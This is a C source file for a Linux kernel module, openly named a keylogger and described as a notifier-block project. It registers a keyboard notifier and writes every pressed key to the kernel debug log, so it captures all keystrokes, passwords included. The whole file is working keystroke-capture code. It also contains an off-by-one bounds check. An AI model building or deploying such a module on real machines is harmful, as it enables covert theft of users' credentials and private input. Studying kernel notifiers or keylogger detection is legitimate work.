/*
===============================================================================
Driver Name		:		linux_keylogger module
Author			:		MURAT DEMIRTAS
License			:		GPL
Description		:		LINUX NOTIFIER BLOCK PROJECT
===============================================================================
*/

#include<linux/cdev.h>
#include<linux/device.h>
#include<linux/fs.h>
#include<linux/init.h>
#include<linux/kdev_t.h>
#include<linux/module.h>
#include<linux/types.h>
#include<linux/uaccess.h>
#include <linux/keyboard.h>
#include "linux_keylogger.h"

/**
 * keyboard notifier cb handler function will handle keyboard events
 * @param pNotifier : which notifier block
 */
int keyboard_notifier_cb(struct notifier_block *pNotifier, unsigned long code, void *_param)
{
	// using keyboard parameter struct for getting informations and values from
	//notifier callback
	struct keyboard_notifier_param *param = _param;

	// we only need key down events for printing!
	if (!(param->down))
		return NOTIFY_OK;

	//if out key codes string array size is smaller then exit.
	if(param->value > sizeof(keycode) / sizeof(char *))
	{
		//printk(KERN_DEBUG "Unsupported key code %x", param->value);
		return NOTIFY_OK;
	}

	//if we are here, then incoming key code will print
	printk(KERN_DEBUG "%s", keycode[param->value]);

	//return with notify ok!
	return NOTIFY_OK;
}

/**
 * define notifier block struct and set callback function
 */
static struct notifier_block keyboard_notifier = {
		.notifier_call = keyboard_notifier_cb	//callback function
};


/**
 * kernel module entry point function. When module is loaded this function will
 * register to notifier subsystem of kernel.
 * @return 0
 * @param
 */
static int __init linux_keylogger_init(void)
{
	//print information message
	printk(KERN_DEBUG "keylogger: registering keyboard,good luck! \r\n");

	//try to register notifier callback using keyboard notifier
	if(register_keyboard_notifier(&keyboard_notifier) !=0)
		printk(KERN_DEBUG "keylogger: error occurred while register to notifier\r\n");

	return 0;
}

/*
 * kernel module exit function, this will clear all notifier struct from
 * keyboard struct list.
 */
static void __exit linux_keylogger_exit(void)
{	
	unregister_keyboard_notifier(&keyboard_notifier);

	printk(KERN_DEBUG "Hello World: Exit\r\n");
}

module_init(linux_keylogger_init);

module_exit(linux_keylogger_exit);

